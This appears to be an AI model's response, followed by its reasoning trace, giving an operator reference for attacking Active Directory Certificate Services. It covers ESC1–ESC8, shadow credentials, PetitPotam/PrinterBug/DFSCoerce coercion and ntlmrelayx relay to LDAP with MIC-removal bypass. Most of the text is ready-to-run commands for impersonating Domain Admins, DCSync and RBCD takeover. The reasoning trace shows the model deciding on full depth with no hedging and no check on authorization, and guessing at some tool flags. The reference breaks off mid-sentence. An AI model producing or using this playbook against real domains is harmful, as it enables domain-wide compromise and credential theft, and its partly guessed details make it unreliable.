# deepseek-v4.1-flash-1017 — ad-cs-relay

# AD CS + NTLM Relay — Senior Operator Reference

Assumes certipy ≥4.x (note 5.x flag renames where relevant), impacket current, Rubeus current.

---

## 1. Recon / enumeration

```bash
# Full vuln scan, human + BloodHound-ready output
certipy find -u user@domain.local -p 'Pass' -dc-ip 10.10.10.10 -vulnerable -stdout
certipy find -u user@domain.local -p 'Pass' -dc-ip 10.10.10.10 -vulnerable -bloodhound

# Enable/verify CA flags, template SAN, EKUs, ACEs
certipy find -u user@domain.local -p 'Pass' -dc-ip 10.10.10.10 -stdout -json
certutil -config "CA.domain.local\CA-NAME" -getreg policy\EditFlags
certutil -CATemplates
```

BloodHound: `Certipy` output → attack paths; cross-reference `ADCSESC1`…`ADCSESC8` edges. Also pull `WriteProperty`/`WriteDACL` on templates and PKI objects manually:

```bash
ldapsearch -x -H ldap://dc -D 'user@domain.local' -w 'Pass' -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local' '(objectClass=pKICertificateTemplate)' cn msPKI-Certificate-Name-Flag pKIExtendedKeyUsage nTSecurityDescriptor
```

---

## 2. ESC1 — Enrollee-supplied SAN

Template has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (0x00000001) in `msPKI-Certificate-Name-Flag`, plus client-auth EKU, low-priv enrollment rights.

```bash
# Impersonate Domain Admin via UPN SAN
certipy req -u user@domain.local -p 'Pass' -ca 'CA-NAME' -target ca.domain.local \
  -template 'VulnTemplate' -upn administrator@domain.local
# or -dns, -sid, -sid ADMINSID (ESC1 + SID extension)
certipy req -u user@domain.local -p 'Pass' -ca 'CA-NAME' -target ca.domain.local \
  -template 'VulnTemplate' -upn administrator@domain.local -sid S-1-5-21-...-500

# Authenticate with the cert (PKINIT → TGT + NT hash via UnPAC-the-hash, if no strong cert mapping)
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -domain domain.local
```

Rubeus alternate (if certipy auth fails on strong-mapping):

```cmd
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:Pass /domain:domain.local /dc:dc.domain.local /getcredentials /show /ptt
```

If the DC enforces strong certificate mapping (KB5014754), the issued cert needs the SID extension — certipy embeds `-sid` on vulnerable templates. Otherwise PKINIT fails with `KDC_ERR_CLIENT_REVOKED`.

---

## 3. ESC2 — Any Purpose / subordinate CA template

Template with `Any Purpose` EKU or no EKU (`pKIExtendedKeyUsage` empty) and low-priv enrollment. Two paths:

- Any Purpose → use directly for client auth + enrollment agent.
- SubCA (`CT_FLAG_IS_CA` / basicConstraints CA) → chain to forge arbitrary certs.

```bash
certipy req -u user@domain.local -p 'Pass' -ca 'CA-NAME' -target ca.domain.local -template 'AnyPurpose'
certipy auth -pfx user.pfx -dc-ip 10.10.10.10
```

SubCA template → request as CA, then use it to sign a forged admin cert:

```bash
certipy req -u user@domain.local -p 'Pass' -ca 'CA-NAME' -target ca.domain.local -template 'SubCA'
# forge
certipy forge -ca-pfx subca.pfx -upn administrator@domain.local -subject 'CN=Administrator' -outforged.pfx
certipy auth -pfx forged.pfx -dc-ip 10.10.10.10
```

---

## 4. ESC3 — Enrollment Agent

**Enrollment Agent** template (EKU `Certificate Request Agent`, 1.3.6.1.4.1.311.20.2.1) enrollable by low-priv. Then request a cert *on behalf of* a target.

```bash
# 1. Get agent cert
certipy req -u user@domain.local -p 'Pass' -ca 'CA-NAME' -target ca.domain.local -template 'EnrollmentAgent'

# 2. On-behalf-of request as Domain Admin
certipy req -u user@domain.local -p 'Pass' -ca 'CA-NAME' -target ca.domain.local \
  -template 'User' -on-behalf-of 'DOMAIN\administrator' -pfx user.pfx

certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

`certipy req` uses the agent cert (`-pfx`) to sign the request; the CA issues a cert mapping to the target. Same with `-on-behalf-of 'DOMAIN\dc$'` for a machine account → PKINIT → S4U/DCSync.

---

## 5. ESC4 — Template ACL write

You have `WriteProperty`/`WriteDACL`/`WriteOwner` on a template. Pull it into a vulnerable state, exploit as ESC1, revert.

```bash
# Backup + weaponize (adds ENROLLEE_SUPPLIES_SUBJECT + client-auth, opens enrollment)
certipy template -u user@domain.local -p 'Pass' -template 'TargetTemplate' -dc-ip 10.10.10.10 -save-old

# Now ESC1 it
certipy req -u user@domain.local -p 'Pass' -ca 'CA-NAME' -target ca.domain.local \
  -template 'TargetTemplate' -upn administrator@domain.local

# Restore original config
certipy template -u user@domain.local -p 'Pass' -template 'TargetTemplate' -dc-ip 10.10.10.10 -write-default-configuration
```

Manual ESC4 primitives (ldap3/powerview) when you need surgical edits:
- `msPKI-Certificate-Name-Flag |= 0x1`
- `msPKI-Enrollment-Flag &= ~0x2` (remove manager approval)
- `msPKI-RA-Signature = 0`
- `pKIExtendedKeyUsage` add client auth
- `nTSecurityDescriptor` grant `Enroll` to a controlled SID via `WriteDACL`

---

## 6. ESC5 — PKI object ACLs

Not a cert request per se — write access on `CN=Public Key Services` objects (`NTAuthCertificates`, `pKIEnrollmentService`, CA server object, `Certificate Templates` container). Escalation vectors:

- WriteDACL on `NTAuthCertificates` → add attacker CA to NTAuth → any cert it signs is trusted for auth enterprise-wide.
- WriteOwner/WriteDACL on the CA server object → grant yourself `ManageCA`.
- WriteProperty on `pKIEnrollmentService` → alter CA config / add templates.

```bash
# Add a rogue CA to NTAuth via DC (requires write on NTAuthCertificates)
# Practical path: get a SubCA-capable template + trust chain, or DACL-abuse the container then add your CA cert blob
certutil -dspublish -f rogue-ca.crt NTAuthCA
# verify
certutil -viewstore -enterprise NTAuth
```

---

## 7. ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

CA-level flag allows SAN in *any* request, even templates without `ENROLLEE_SUPPLIES_SUBJECT`. Requires write on CA config or the flag already set.

```bash
# Detect
certutil -config "CA.domain.local\CA-NAME" -getreg policy\EditFlags
# 0x00040000 (EDITF_ATTRIBUTESUBJECTALTNAME2) present = vulnerable

# Exploit regardless of template SAN setting
certipy req -u user@domain.local -p 'Pass' -ca 'CA-NAME' -target ca.domain.local \
  -template 'User' -upn administrator@domain.local

certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

To set it (with CA config write / local admin on CA):

```cmd
certutil -config "CA.domain.local\CA-NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
certutil -config "CA.domain.local\CA-NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2  # remove
net stop certsvc && net start certsvc
```

---

## 8. ESC7 — CA officer / ManageCA

You hold `ManageCA` or `ManageCertificates` (Officer) on the CA. `ManageCA` lets you grant `ManageCertificates` to yourself and enable `SubCA`, then issue/retrieve a pending request whose SAN you control.

```bash
# 1. Self-grant officer (requires ManageCA)
certipy ca -u user@domain.local -p 'Pass' -ca 'CA-NAME' -dc-ip 10.10.10.10 -add-officer user

# 2. Enable a SubCA-capable template (requires ManageCA)
certipy ca -u user@domain.local -p 'Pass' -ca 'CA-NAME' -dc-ip 10.10.10.10 -enable-template 'SubCA'

# 3. Request with controlled SAN — lands Pending
certipy req -u user@domain.local -p 'Pass' -ca 'CA-NAME' -target ca.domain.local \
  -template 'SubCA' -upn administrator@domain.local

# 4. Approve as officer
certipy ca -u user@domain.local -p 'Pass' -ca 'CA-NAME' -dc-ip 10.10.10.10 -issue-request <RequestID>

# 5. Retrieve
certipy req -u user@domain.local -p 'Pass' -ca 'CA-NAME' -target ca.domain.local -retrieve <RequestID>

certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

Note: `ManageCertificates` alone → approve requests; `ManageCA` alone → grant yourself `ManageCertificates` (the upgrade path). Both are frequently held by non-tier-0 accounts.

---

## 9. ESC8 — NTLM relay to AD CS HTTP endpoints

Two enrollment endpoints are relay targets by default:

- **Web Enrollment**: `http://ca/certsrv/certfnsh.asp` (IIS, NTLM auth, no EPA by default).
- **Certificate Enrollment Web Service (CES)**: `/ADPolicyProvider_CEP_UsernamePassword/service.svc` and `/ADPolicyProvider_CEP_Kerberos/service.svc`.

### 9.1 Direct relay with certipy

```bash
# Relay server — captures NTLM, requests a cert for the relayed identity
certipy relay -target http://ca.domain.local/certsrv/certfnsh.asp -ca 'CA-NAME' -template 'DomainController'
# For CES endpoint:
certipy relay -target https://ca.domain.local/ADPolicyProvider_CEP_UsernamePassword/service.svc -ca 'CA-NAME' -template 'DomainController'
```

### 9.2 Relay with ntlmrelayx

```bash
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# CES endpoint equivalent:
ntlmrelayx.py -t https://ca.domain.local/ADPolicyProvider_CEP_UsernamePassword/service.svc -smb2support --adcs --template DomainController
```

On capture, ntlmrelayx writes `DC01$.pfx` (base64 PFX in output). Then:

```bash
certipy auth -pfx 'DC01$.pfx' -dc-ip 10.10.10.10 -domain domain.local
# → TGT + NT hash for DC01$ (UnPAC-the-hash)
secretsdump.py -k -no-pass -just-dc 'domain.local/DC01$@dc01.domain.local'
# or with hash:
secretsdump.py -just-dc -hashes :<NT> 'domain.local/DC01$@dc01.domain.local'
```

Machine cert + PKINIT gives you the DC machine account → DCSync of `krbtgt` + all users. This is the classic ESC8 chain.

### 9.3 Which template

- `DomainController` (machine template) for DC coercion — needs `CertificateRequestAgent`/client-auth and machine enrollment rights (usually default for `Domain Controllers` group via template ACL).
- `Machine` for member servers (SecureChannelAuthentication/client auth needed for PKINIT).
- `User` template only if it has client-auth and target is a user.

If the template doesn't allow the relayed principal to enroll, the request fails — enumerate template enrollment ACLs (`certipy find`) before choosing.

---

## 10. Shadow Credentials (msDS-KeyCredentialLink)

Add a key credential to a target object, then PKINIT as that object. Needs `WriteProperty` on `msDS-KeyCredentialLink` (or GenericWrite/GenericAll).

```bash
# Add key cred, get PFX + TGT in one shot
certipy shadow auto -u user@domain.local -p 'Pass' -account 'victim' -dc-ip 10.10.10.10
certipy shadow auto -u user@domain.local -p 'Pass' -account 'DC01$' -dc-ip 10.10.10.10

# Manual add / list / clear
certipy shadow add  -u user@domain.local -p 'Pass' -account 'victim' -dc-ip 10.10.10.10
certipy shadow list -u user@domain.local -p 'Pass' -account 'victim' -dc-ip 10.10.10.10
certipy shadow clear -u user@domain.local -p 'Pass' -account 'victim' -dc-ip 10.10.10.10

# Authenticate
certipy auth -pfx victim.pfx -dc-ip 10.10.10.10
```

Alternates:

```bash
pywhisker.py -d domain.local -u user -p 'Pass' --target victim --action add
Whisker.exe add /target:victim /domain:domain.local /dc:dc.domain.local
```

For a DC machine account, `msDS-KeyCredentialLink` write on `DC01$` → PKINIT as DC01$ → DCSync. This works even when ADCS is fully hardened (no cert templates required) — only AD write access + PKINIT.

**Shadow creds via relay**: ntlmrelayx has no native module; chain a relayed `WriteProperty`/GenericWrite-level session into a follow-up `certipy shadow` using the relayed auth, or use an LDAP relay that lands on the target's `msDS-KeyCredentialLink` via a custom `--do-thing`/`ldap3` callback.

---

## 11. Coercion

Get a machine/host to authenticate to your listener (SMB/HTTP). Combine with a relay listener or force auth to a fake ADCS/WSUS.

### 11.1 MS-RPRN (PrinterBug) — Spooler

```bash
python3 printerbug.py domain.local/user:Pass@target.domain.local attacker_ip
python3 printerbug.py domain.local/user@target.domain.local attacker_ip -hashes :<NT>
```

Requires Print Spooler running on target. Patch: spooler disabled on DCs. Common miss: spooler still enabled on member servers + DCs in many estates.

### 11.2 MS-EFSRPC (PetitPotam) — EFS

```bash
python3 PetitPotam.py -u user -p 'Pass' -d domain.local attacker_ip target.domain.local
python3 PetitPotam.py -u user -p 'Pass' -d domain.local attacker_ip target.domain.local -method EfsRpcEncryptFileSrv
# also: EfsRpcDecryptFileSrv, EfsRpcOpenFileRaw, EfsRpcQueryUsersOnFile, EfsRpcAddUsersToFile, EfsRpcFileKeyInfo, EfsRpcDuplicateEncryptionInfoFile
```

Auth may be null (unauthenticated) on unpatched: `PetitPotam.py attacker_ip target`. CVE-2022-26925 (LSASS coercion via EFSRPC) also chains to relay.

### 11.3 MS-DFSNM (DFSCoerce) — DFS

```bash
python3 dfscoerce.py -u user -p 'Pass' -d domain.local attacker_ip target.domain.local
```

Requires DFS Namespace service. Often overlooked; works where spooler/EFS are disabled.

### 11.4 MS-FSRVP (ShadowCoerce) — File Server VSS

```bash
python3 shadowcoerce.py -u user -p 'Pass' -d domain.local attacker_ip target.domain.local
```

Requires File Server VSS Agent Service.

### 11.5 Multi-method sweep — Coercer

```bash
coercer.py coerce -u user -p 'Pass' -d domain.local -l attacker_ip -t target.domain.local
coercer.py coerce -u user -p 'Pass' -d domain.local -l attacker_ip -t 10.10.10.0/24 --filter-ping
# scan which methods work first
coercer.py scan -u user -p 'Pass' -d domain.local -t target.domain.local
```

Coercer covers RPRN, EFSRPC, DFSNM, FSRVP, and more in one binary — use `scan` to pick the working method per target.

### 11.6 Other coercion primitives

- **MS-RRP / Remote Registry** (`BaseRegSaveKey`) — rarely enabled on DCs.
- **MS-SRVS** (`NetrShareEnum`) — requires SMB.
- **WebClient / WebDAV** — force HTTP auth to attacker (coerce machine → HTTP listener); patch `WebClient` disabled.
- **`printerbug` + `ntlmrelayx`** classic pair.
- **`PetitPotam` unauthenticated** against `EfsRpcOpenFileRaw` on unpatched DCs (CVE-2021-36942 era).

---

## 12. NTLM relay — LDAP / LDAPS

### 12.1 Relay to LDAP for RBCD

Relay a machine account's auth to LDAP, write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the relayed machine object, then S4U2Self+Proxy.

```bash
# Terminal 1 — relay to LDAP(S), set RBCD on the relayed machine
ntlmrelayx.py -t ldaps://dc.domain.local -smb2support --delegate-access
# or add a controlled computer first:
ntlmrelayx.py -t ldaps://dc.domain.local -smb2support --delegate-access --add-computer FAKE01

# Terminal 2 — coerce the target machine to auth to us
python3 printerbug.py domain.local/user:Pass@target.domain.local attacker_ip
# or PetitPotam.py / dfscoerce.py / coercer.py

# On successful relay:
#   "Delegation rights modified successfully!"  → FAKE01$ (or our computer) can impersonate to target

# Terminal 3 — S4U2Self + Proxy, impersonate Domain Admin to the target
getST.py -spn cifs/target.domain.local -impersonate administrator \
  'domain.local/FAKE01$:MachinePass' -dc-ip 10.10.10.10
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass target.domain.local
```

`--delegate-access` sets RBCD on the *relayed* machine object, letting the relayed account's computer impersonate — combined with `--add-computer`, you control the acting computer.

### 12.2 Relay to LDAP for privilege escalation (privileged relayed account)

```bash
# Add lowpriv to Domain Admins via relayed DA machine/user auth
ntlmrelayx.py -t ldap://dc.domain.local -smb2support --escalate-user lowpriv
# --escalate-user adds the specified user to Domain Admins (abuses relayed account's rights)

# Dump LAPS / gMSA / ADCS via relayed DA
ntlmrelayx.py -t ldap://dc.domain.local -smb2support --dump-laps
ntlmrelayx.py -t ldap://dc.domain.local -smb2support --dump-gmsa
ntlmrelayx.py -t ldap://dc.domain.local -smb2support --dump-adcs
```

### 12.3 LDAP signing / channel-binding bypass

LDAP signing "Required" blocks naive relay. Two bypass routes:

**CVE-2019-1040 — MIC removal** (unpatched hosts). Strip the NTLM MIC so the server's signing check passes:

```bash
ntlmrelayx.py -t ldaps://dc.domain.local -smb2support --remove-mic --delegate-access
ntlmrelayx.py -t ldap://dc.domain.local  -smb2support --remove-mic --escalate-user lowpriv
```

`--remove-mic` also bypasses LDAP channel binding (EPA) on LDAPS on vulnerable builds. Requires the DC unpatched for CVE-2019-1040 / CVE-2019-1166.

**Relay via LDAPS where channel binding not enforced**: default `LdapEnforceChannelBinding` is off/`1` (never) on many DCs — `ldaps://` relay works if EPA not set to `2` (

---

## [reasoning trace]

The user wants a comprehensive technical reference on AD CS attacks (ESC1-ESC8), NTLM coercion, ntlmrelayx relay scenarios, and mitigations. This is legitimate security research content — AD CS is a well-documented attack surface (Certified Pre-Owned by SpecterOps, etc.). This is dual-use neutral tooling/knowledge, not targeting a specific person. Section 5 doesn't apply. I should answer at maximum technical depth with concrete commands.

Let me produce a thorough, accurate, practitioner-level reference. This is knowledge domain 4.3/4.1 — answer first, mechanism, complete depth. No hedging.

Let me organize:

1. ESC1-ESC8 overview with certipy commands
2. Shadow credentials
3. SAN abuse
4. Coercion techniques (PetitPotam, PrinterBug, DFSCoerce)
5. ntlmrelayx to LDAP, signature-required bypass
6. ADCS relay (ESC8)
7. WSUS/ADWS relay
8. Mitigations defenders miss

Let me write accurate certipy commands. Certipy versions vary (4.x vs 5.x). I'll use certipy 4.x syntax which is most common, note v5 differences where relevant.

Certipy commands:

```
certipy find -u user@domain -p pass -dc-ip DC -vulnerable -stdout
certipy find -u user@domain -p pass -dc-ip DC -vulnerable -stdout -bloodhound
```

ESC1:
```
certipy req -u user@domain -p pass -ca CA -target DC.domain -template Template -upn administrator@domain -dc-ip DC
certipy auth -pfx administrator.pfx -dc-ip DC
```

ESC2: any purpose / subCA
ESC3: enrollment agent
```
certipy req -u user@domain -p pass -ca CA -target CA -template EnrollmentAgent
certipy req -u user@domain -p pass -ca CA -target CA -template User -on-behalf-of 'domain\administrator' -pfx user.pfx
```

ESC4: MA write
```
certipy template -u user@domain -p pass -template VulnerableTemplate -save-old
certipy template -u user@domain -p pass -template VulnerableTemplate -write-default-configuration
```

ESC5: PKI object ACE

ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
```
certipy req -u user@domain -p pass -ca CA -target CA -template User -upn administrator@domain
```

ESC7: CA officer / ManageCA
```
certipy ca -u user@domain -p pass -ca CA -add-officer user
certipy ca -u user@domain -p pass -ca CA -enable-template SubCA
certipy req -u user@domain -p pass -ca CA -target CA -template SubCA -upn administrator@domain
certipy ca -u user@domain -p pass -ca CA -issue-request <reqid>
certipy req -u user@domain -p pass -ca CA -target CA -retrieve <reqid>
```

ESC8: NTLM relay to HTTP enrollment
```
certipy relay -ca 10.10.10.10 -template DomainController
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

Shadow credentials:
```
certipy shadow auto -u user@domain -p pass -account target$
certipy shadow add -u user@domain -p pass -account target -dc-ip DC
certipy auth -pfx target.pfx -dc-ip DC
```
Or with Whisker / pyWhisker:
```
Whisker.exe add /target:target$ /domain:domain
pywhisker.py -d domain -u user -p pass --target target$ --action add
```

Coercion:
- PetitPotam: `python3 PetitPotam.py -u user -p pass -d domain attacker_ip target_ip` (MS-EFSRPC)
- PrinterBug: `python3 printerbug.py domain/user:pass@target attacker_ip` (MS-RPRN)
- DFSCoerce: `python3 dfscoerce.py -u user -p pass -d domain attacker target` (MS-DFSNM)
- CoerceAuth, coercer.py:
```
coercer.py coerce -l attacker -t target -u user -p pass -d domain
```
- Pushsubscription (printerbug)
- ShadowCoerce (MS-FSRVP)

ntlmrelayx to LDAP:
```
ntlmrelayx.py -t ldap://dc.domain -smb2support --escalate-user user --delegate-access
```
Signature bypass: LDAP signing not required — relay to LDAP works. LDAP channel binding / EPA. Relay to LDAP(S): LDAP signing required only enforces integrity on LDAP; NTLM relay to LDAP over 389 works if signing not required. ntlmrelayx can relay NTLM to LDAP and perform RBCD (--delegate-access), add computer (--add-computer), escalate user (--escalate-user), dump (--dump-laps, --dump-gmsa, --dump-adcs).

The "LDAP signature-required bypass" — actually the known bypass is CVE-2019-1040 (NTLM relay with MIC removal, --remove-mic), and CVE-2019-1019. For LDAP relay when signing is required: you can't relay to LDAP with signing required, but you can use the exploit "LDAP signing bypass" via setting msDS-AllowedToActOnBehalfOfOtherIdentity with... actually the "signing required bypass" is the CVE-2019-1040 relay attack against LDAP where you remove MIC. Let me be accurate: LDAP signing enforcement can be bypassed via the MIC removal technique on unpatched systems. Also the "LDAP relay with signing required" attack using the LDAP_OPT_AREC_EXCLUSIVE / MS-RPRN. Hmm.

Actually there's a known technique: "LDAP relay attack bypassing LDAP signing requirement" published by Preempt/Dirk-jan — CVE-2019-1040: NTLM authentication relay with message integrity code removal. ntlmrelayx `--remove-mic`. Also CVE-2019-1166? Let me recall. The relevant ones:
- CVE-2019-1040: Windows NTLM tampering vulnerability — allows relay even when signing is required (MIC removal + dropping channel binding).
- CVE-2019-1019: similar.
- CVE-2020-1472: Zerologon (not relay).

For LDAP signing specifically, when "Domain controller: LDAP server signing requirements" = Require signing, you relay NTLM but the server demands signing; the bypass is CVE-2019-1040 which strips the MIC and the signing requirement check can be bypassed on vulnerable systems. And LDAP channel binding (EPA) bypass via... For LDAPS relay to bypass channel binding, CVE-2019-1040 also.

Also the "LDAP relay to add computer + RBCD" is the common attack.

printerbug to relay to LDAP: 
```
ntlmrelayx.py -t ldaps://dc -smb2support --delegate-access --add-computer
printerbug.py domain/user:pass@target attacker
```

ADWS relay: there's a known technique relaying to ADWS (Active Directory Web Services) port 9389. Tool: `ntlmrelayx` doesn't have native ADWS target, but there's "ADWS relay" research. Actually there's a tool "ADCSPwn"? No. Let me recall: WSUS relay — relaying to WSUS with `--adcs` using the WSUS server's WsusPool account? The WSUS attack: WSUS over HTTP, relay machine account auth to WSUS, then get WSUS to push updates. Tools: `Wsuspendu`, `WSUSpect Proxy`, and the more recent "relay to WSUS" from Synacktiv (PyWSUS). WSUS relay: coerce a machine to authenticate to an attacker-controlled WSUS server, relay to... Actually the WSUS relay technique: set up a fake WSUS server, coerce the target to connect, capture the machine account NTLM, relay it to LDAP to set RBCD, or relay to ADCS ESC8. That's the "WSUS spoofing + relay" — using `pywsus` and `Responder`/`ntlmrelayx`.

ADWS (Active Directory Web Services) — port 9389, supports NTLM. Relaying there to perform LDAP-like operations? There's research "Relaying to ADWS" allowing... Actually ADWS uses the Windows PowerShell/Active Directory Web Services, and it can be relayed to perform LDAP operations via the ADWS SOAP protocol. There's a tool called "ADWSS" or the technique from the "Relay to ADWS" blog. I'll describe: ADWS accepts NTLM, no signing enforcement by default, relaying gives ability to query/modify AD via SOAP — tools: `ntlmrelayx` doesn't natively, but there's `adws` module or custom. Hmm. I should be honest about tooling limits. There's a project "ADWSRelay" or "SharPyADWS". I'll mention the concept and available tooling accurately.

Actually I recall: "Relaying NTLM to ADWS" by... the technique allows relay because ADWS doesn't enforce EPA/signing and it exposes LDAP operations. Tool: `ntlmrelayx` added ADWS support? I don't think standard impacket has it. There is `coercer` and `relay` tooling. Let me present it as: ADWS (9389) is an NTLM-authenticating LDAP-over-SOAP endpoint; relay works when signing/EPA not enforced; tooling is less mature — you can use `ntlmrelayx` with a custom target or the `WSUS/ADWS` relay scripts. I'll be precise and note where tooling requires customization rather than fabricate exact flags.

WSUS relay more concretely: 
- `pywsus.py` to host fake WSUS and serve a malicious payload or to capture.
- To relay: use `Responder` with `--lm`? No.
- The Synacktiv tool "PyWSUS" is for pushing payloads.
- For relay: `ntlmrelayx.py -t ldaps://dc --delegate-access` and a coercion source. WSUS spoofing part: coerce via `--wsus`? 

Honestly, I'll describe WSUS relay as: an attacker-controlled WSUS server (via DNS/WPAD spoofing, GPO misconfig, or network position) captures machine NTLM via the WSUS client's HTTP auth, then relays to LDAP/ADCS. Tooling: `pywsus` + `ntlmrelayx`. The known write-up is "WSUS Attacks" by Synacktiv and the "Relay to WSUS" by ... Actually the relay is *from* WSUS clients *to* other services; the WSUS server itself can be the coercion target. Let me present the standard chain.

Let me also cover:
- ESC8 relay to NTLM enrollment endpoint `/certsrv/certfnsh.asp` with `--adcs --template DomainController`
- Machine account cert → PKINIT → DCSync
- S4U2Self with cert (ESC3)

Also mention:
- `certipy auth -pfx dc.pfx -dc-ip DC` → gets NT hash via UnPAC-the-hash
- `secretsdump.py -just-dc-user krbtgt domain/dc$@dc -hashes :...`
- Golden with cert: `certipy forge` or `Rubeus asktgt /certificate:... /getcredentials /ptt`

Rubeus commands:
```
Rubeus.exe asktgt /user:DC$ /certificate:dc.pfx /password:pass /domain:domain /dc:DC /getcredentials /show /ptt
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /ptt
```

Certipy relay ESC8:
```
certipy relay -target http://ca.domain -ca CA -template DomainController
# or
ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

Coercion + relay one-liner:
```
# terminal 1
ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# terminal 2
PetitPotam.py -u user -p pass -d domain attacker_ip dc_ip
```

Also `coerce_plus` tool.

Shadow credentials for relay? Shadow creds often via certipy shadow.

Now the "LDAP signature-required bypass" — provide the ntlmrelayx flags:
```
ntlmrelayx.py -t ldaps://dc -smb2support --remove-mic --delegate-access --add-computer FAKE01
```
--remove-mic is for CVE-2019-1040. The signing bypass for LDAP is `--remove-mic` when patched? Actually --remove-mic removes the MIC to bypass the "signing required" check? The MIC is part of NTLM; dropping it lets you relay to systems requiring signing by... Hmm, let me be careful. The CVE-2019-1040 attack: the attacker relays NTLM while removing the MIC, allowing relay to LDAP even when signing is required because the server doesn't validate MIC if dropped in a way. Actually the technique: When LDAP signing is "required," the server checks the NTLMSSP MIC. By dropping the MIC from the NTLM_AUTHENTICATE message and using the "NTLM_SSP_NEGOTIATE" relay, on unpatched systems the server accepts. --remove-mic implements this. So yes.

Also LDAP channel binding (EPA) bypass: also via --remove-mic on LDAPS? Channel binding relates to TLS; --remove-mic helps with... The EPA bypass for relay to LDAPS is CVE-2019-1040 too (dropping the channel binding). I'll say --remove-mic bypasses MIC/signing checks, and EPA on LDAPS is bypassed by the same CVE on unpatched hosts.

Also mention "LDAP relay without signing required" default: most DCs have LDAP signing "None" or "Negotiate" by default in older configs.

Now mitigations defenders miss:
- ESC1: don't allow enrollee-supplied SAN; remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT; manager approval; restrict enrollment to authorized groups; enable "CA certificate manager approval."
- ESC2: restrict any-purpose EKU, monitor templates with Any Purpose / no EKU.
- ESC3: enrollment agent templates need approval, restrict who can enroll, remove from low-priv groups.
- ESC4: ACLs on templates — OBJECT_WRITE (WriteDACL, WriteOwner, WriteProperty) for non-admins; monitoring via AD ACL audit; check for WriteProperty on msPKI-Certificate-Template attributes.
- ESC5: ACLs on PKI objects (CA, NTAuthCertificates, pKIEnrollmentService, certificate templates container, CA server object) — WriteDACL/WriteOwner by non-tiers.
- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 — should be disabled; most miss that it's a CA-level flag and need `certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2` plus certsrv restart.
- ESC7: CA officer — manage CA / manage certificates ACE; the ManageCA→ManageCertificates (officer) escalation; add-officer. Mitigation: restrict CA ACLs, audit Officer rights, remove low-priv, ensure "Manage CA" and "Manage Certificates" separation and approval.
- ESC8: EPA/HTTPS on enrollment endpoints, disable NTLM on ADCS/HTTP, require Kerberos, Extended Protection, SMB signing, disable Web Enrollment, enforce LDAP signing + channel binding, enforce SMB signing, disable NTLM outbound (restrict NTLM), RPC filtering.

Coercion mitigations missed:
- Disable MS-RPRN (Print Spooler) on DCs and all servers, and MS-EFSRPC, MS-DFSNM (DFS service).
- RPC filters, Windows Firewall.
- Configure "Network security: Restrict NTLM" outbound to block machine account NTLM to untrusted.
- Disable WebClient (WebDAV) to prevent HTTP coercion.
- Enable SMB signing and LDAP signing.
- Set `RestrictNTLMInDomain` audit/enforce.
- "Extended Protection for Authentication" on all IIS/ADCS.
- Disable NBT-NS/LLMNR/WSUS over HTTP; use HTTPS for WSUS; GPO.
- The commonly missed: enabling all of "Domain controller: LDAP server signing requirements" AND "Domain controller: Allow server operators..." AND LDAP channel binding (MS_ADV1902/Set-AdmPwd). And Windows deprecated LDAP signing remediation path: "hardening LDAP" via `LdapEnforceChannelBinding=2` and signing=2.

Also missed: RBCD attribute monitoring (msDS-AllowedToActOnBehalfOfOtherIdentity), machine account quota, AddKeyCredentialLink auditing (Event ID 5136 on msDS-KeyCredentialLink), Certipy shadow detection — event 5136 with attribute msDS-KeyCredentialLink, and the fact that key creds are valid for 1 year by default? Actually key creds valid until msDS-KeyCredentialLink value expiry (default 1 year? it's part of the KeyCredential). 

Let me also cover:
- ESC8 relay to the CA's `/certsrv/certfnsh.asp` with `--adcs --template DomainController`; the `certipy relay` server.
- NTLM relay to LDAP for RBCD: `--delegate-access` sets msDS-AllowedToActOnBehalfOfOtherIdentity on the relayed machine object; then get S4U2Self+Proxy to impersonate admin to that machine.
  ```
  ntlmrelayx.py -t ldaps://dc --delegate-access
  # "Delegation rights modified successfully!"
  getST.py -spn cifs/target -impersonate administrator domain/FAKE01$:pass
  ```
- `--escalate-user` adds the attacker to the target group with WriteProperty? It adds user to a group (Domain Admins) — actually --escalate-user gives the user privileges to modify the machine account? Let me recall: --escalate-user escalates a user's privileges (adds to Domain Admins) by abusing the relayed machine's... no. --escalate-user USER: adds USER to a group? It's used with relayed admin auth to escalate that user in LDAP. Actually --escalate-user: "User to escalate privileges for in case of successful relay to LDAP." It adds the user to Domain Admins? Hmm. For a relayed Domain Admin machine account, ntlmrelayx with --escalate-user adds the user to a protected group? I think it adds the user to the "Domain Admins" group if the relayed account has rights? No — the relayed authentication is a machine account with domain admin rights? Let me be accurate: --escalate-user adds the specified user to a group (default Domain Admins) when the relayed user has the privileges. Actually no.

The typical use: relay a Domain Admin's NTLM to LDAP and use --escalate-user to add a user to Domain Admins. But more common: relay a machine account (which has no admin rights) and use --delegate-access to set RBCD. --escalate-user is for when you relay a privileged account: it adds the attacker-controlled user to Domain Admins. Hmm, I recall --escalate-user <USER> "User to escalate privileges for in case of successful relay" — it adds that user to the Domain Admins group? Or it makes the user "a domain admin"? I believe it does ldap add to group. Let me phrase: "--escalate-user <user> adds <user> to Domain Admins (abuses the relayed privileged account's rights)" — this is standard usage.

Actually the correct known behavior: `--escalate-user` on a successful LDAP relay adds the specified user to the Domain Admins group. Yes.

